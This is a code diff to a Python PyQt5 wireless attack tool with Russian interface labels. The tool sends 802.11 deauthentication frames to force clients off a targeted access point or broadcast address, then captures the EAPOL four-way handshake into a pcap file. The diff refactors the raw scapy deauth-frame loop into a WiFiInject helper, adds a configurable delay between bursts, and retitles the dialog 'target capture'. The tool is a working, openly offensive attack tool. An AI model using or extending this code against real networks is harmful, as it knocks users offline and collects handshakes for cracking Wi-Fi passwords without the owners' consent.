@@ -3,7 +3,7 @@
 from PyQt5.QtWidgets import (
 	QApplication, QTreeView, QVBoxLayout, QHBoxLayout, QWidget, QHeaderView, QPushButton, QLabel, QProgressBar, 
 	QStyledItemDelegate, QStyleOptionProgressBar, QStyle, QComboBox, QSizePolicy, QMessageBox, QDialog, QTextEdit, QFileDialog,
-	QMainWindow, QTableView, QGroupBox, QFrame, QSpinBox, QCheckBox
+	QMainWindow, QTableView, QGroupBox, QFrame, QSpinBox, QDoubleSpinBox, QCheckBox
 )
 from PyQt5.QtGui import QStandardItemModel, QStandardItem, QIcon, QPainter, QColor, QPen, QPainterPath, QFont, QKeyEvent
 from PyQt5.QtCore import Qt, QEvent, QSize, QTimer, QObject, QMetaObject, Q_ARG, pyqtSlot
@@ -18,7 +18,7 @@ import pcapy
 import shutil
 
 from scapy.all import *
-import misc
+from misc import WiFiInject, WiFiPhyManager, WiFi_Parser
 
 def scale_rssi(rssi_value, min_rssi=-90, max_rssi=-40, new_min=0, new_max=100):
     return max(new_min, min(new_max, (rssi_value - min_rssi) * (new_max - new_min) / (max_rssi - min_rssi) + new_min))
@@ -109,7 +109,7 @@ class DeauthDialog(QDialog):
 		self.CLIENT = None
 		self.deauth_count = 5
 		
-		self.setWindowTitle(f"Мониторинг сети ya_setko")
+		self.setWindowTitle("Захват цели")
 		
 		xrandr_wxh = subprocess.check_output("xrandr | grep '*' | awk '{print $1}'", shell=True).decode()
 		wh = xrandr_wxh.split('x')
@@ -119,7 +119,7 @@ class DeauthDialog(QDialog):
 		y = round((int(wh[1]) / 2) - (h / 2))
 		
 		self.setGeometry(x, y, w, h)
-		self.setWindowIcon(QIcon('icons/satellite-dish.png'))
+		self.setWindowIcon(QIcon('icons/target.png'))
 		
 		self.interface_label = QLabel("<b>Interface:</b> -")
 		self.bssid_label = QLabel("<b>Target:</b> -")
@@ -184,10 +184,10 @@ class DeauthDialog(QDialog):
 		deauth_reason_combo_row.addStretch()
 		
 		self.deauth_timeout_edit = QSpinBox()
-		self.deauth_timeout_edit.setRange(1, 10)
-		self.deauth_timeout_edit.setValue(3)
+		self.deauth_timeout_edit.setRange(0, 10)
+		self.deauth_timeout_edit.setValue(1)
 		deauth_timeout_edit_row = QHBoxLayout()
-		deauth_timeout_edit_row.addWidget(QLabel('Максимальное время ожидания EAPOL-фрейма'))
+		deauth_timeout_edit_row.addWidget(QLabel('Время между посылками деавторизации'))
 		deauth_timeout_edit_row.addWidget(self.deauth_timeout_edit)
 		deauth_timeout_edit_row.addWidget(QLabel('сек'))
 		deauth_timeout_edit_row.addStretch()
@@ -292,9 +292,9 @@ class DeauthDialog(QDialog):
 		self.refresh_timer.setInterval(1)
 		self.refresh_timer.timeout.connect(self.refresh_oher_data)
 		self.refresh_timer.start()
-		self.wifi = misc.WiFiPhyManager()
 
-		self.wifi.switch_iface_channel(self.interface, self.channel)
+		self.wifiman = WiFiPhyManager()
+		self.wifiman.switch_iface_channel(self.interface, self.channel)
 		self.beacons = 0
 		signal.signal(signal.SIGINT, self.handle_interrupt)
 		self.log_add(f"[+] Switching {self.interface} to channel {self.channel}")
@@ -310,8 +310,8 @@ class DeauthDialog(QDialog):
 			self.client = model.data(model.index(row, 0), Qt.UserRole)
 			self.CLIENT = self.client.upper()
 		else:
-			self.client = 'ff:ff:ff:ff:ff:ff'
-			self.CLIENT = self.client.upper()
+			self.client = None
+			self.CLIENT = None
 		threading.Thread(target=self.send_deauth).start()
 		
 	def save_pcap(self):
@@ -488,7 +488,7 @@ class DeauthDialog(QDialog):
 					self.safe_update_item_by_mac(self.get_mac_vendor_mixed(st_mac), 2, str(self.stations[st_mac]['frames']))
 					self.safe_update_item_by_mac(self.get_mac_vendor_mixed(st_mac), 4, f"{self.stations[st_mac]['rate']} mB/s")
 					self.safe_update_item_by_mac(self.get_mac_vendor_mixed(st_mac), 5, self.stations[st_mac]['modulation'])
-		
+
 		if pkt.haslayer(Dot11):
 			if pkt.type == 0 and pkt.subtype in [2, 12]:
 				d_st_mac = pkt.addr1 if pkt.addr1 in self.stations else (pkt.addr2 if pkt.addr2 in self.stations else None)
@@ -500,7 +500,7 @@ class DeauthDialog(QDialog):
 					if 'R' not in self.stations[d_st_mac]['flags'] and pkt.subtype == 2:
 						self.stations[d_st_mac]['flags'].append('R')
 						self.safe_update_item_by_mac(self.get_mac_vendor_mixed(d_st_mac), 6, ' '.join(self.stations[d_st_mac]['flags']))
-							
+
 		if pkt.haslayer(EAPOL) and pkt[EAPOL].type == 3 and pkt.addr3 == self.bssid:
 			raw_data = bytes(pkt[EAPOL])
 			key_info = int.from_bytes(raw_data[5:7], 'big')
@@ -532,51 +532,45 @@ class DeauthDialog(QDialog):
 						self.safe_log_add(f"[+] Received M4 Message from \"{self.get_mac_vendor_mixed(eapol_st)}\"")
 						if 'M4' not in self.stations[eapol_st]['flags']:
 							self.stations[eapol_st]['flags'].append('M4')
-								
+
 					self.safe_update_item_by_mac(self.get_mac_vendor_mixed(eapol_st), 6, ' '.join(self.stations[eapol_st]['flags']))
-			
+
 		if pkt.haslayer(Dot11Beacon):
 			bssid = pkt.addr3
 			if bssid == self.bssid:
 				self.beacons += 1
-				wifi = misc.WiFi_Parser(pkt)
+				wifi = WiFi_Parser(pkt)
 				signal = wifi.RadioTap_Attr('dBm_AntSignal') #pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else None
 				ssid = wifi.ssid() #pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else None
 				self.ssid = ssid
 				#channel =  #dot11_utils.get_channel(pkt)
-				
+
 				if not self.first_beacon_flag:
 					self.first_beacon_flag = True
 					self.packets.append(pkt)
 					self.safe_log_add(f"[+] Done, ssid=\"{ssid}\"")
+					self.setWindowTitle(f"Захват цели - {ssid}")
 					self.btn_deauth.setEnabled(True)
-					
+
 				self.safe_update_ap_ssid(ssid)
 				self.safe_update_ap_rssi(signal)
 				self.safe_update_ap_beacons(self.beacons)
-				
-			
-	def send_deauth(self):
+
+	def deauth_log_callback(self, attempt, count, bssid, client, reason_code):
+		bssid = self.get_mac_vendor_mixed(bssid)
+		client = self.get_mac_vendor_mixed(client)
+		if client != 'FF:FF:FF:FF:FF:FF':
+			self.safe_log_add(f"[+] Sending direct deauth as {client} to {bssid} (reason={reason_code}) ({attempt} of {count})")
+		else:
+			self.safe_log_add(f"[+] Sending direct deauth to broadcast (reason={reason_code}) ({attempt} of {count})")
+
+	def send_deauth(self):	
 		self.btn_deauth.setEnabled(False)
 		pcap = pcapy.open_live(self.interface, 100, 1, 9)
 		reason_index = self.deauth_reason_combo.currentIndex()
 		reason_code = self.deauth_reason_combo.itemData(reason_index) 
 		deauth_attempts = self.deauth_attempts_edit.value()
 
-		for i in range(deauth_attempts):
-			if self.client != 'ff:ff:ff:ff:ff:ff':
-				self.safe_log_add(f"[+] Send deauth to {self.BSSID} as {self.CLIENT} ({i +1} / {deauth_attempts}) (reason={reason_code})")
-			else:
-				self.safe_log_add(f"[+] Send deauth to broadcast as {self.BSSID} ({i +1} / {deauth_attempts}) (reason={reason_code})")
-			
-			for pnt_num in range(self.deauth_packets_edit.value()):
-				deauth_pkt = bytes(RadioTap() / Dot11(addr1=self.client, addr2=self.bssid, addr3=self.bssid, SC=(pnt_num << 4)) / Dot11Deauth(reason=reason_code))
-				pcap.sendpacket(deauth_pkt)
-			time.sleep(1)
+		wifi_sender = WiFiInject(self.interface, self.bssid, self.client)
+		wifi_sender.deauth(reason_code, deauth_attempts, self.deauth_packets_edit.value(), self.deauth_timeout_edit.value(), self.deauth_log_callback)
 		self.btn_deauth.setEnabled(True)
-		
-if __name__ == '__main__':
-	app = QApplication(sys.argv)
-	window = DeauthDialog('', '', '')
-	window.show()
-	sys.exit(app.exec_())
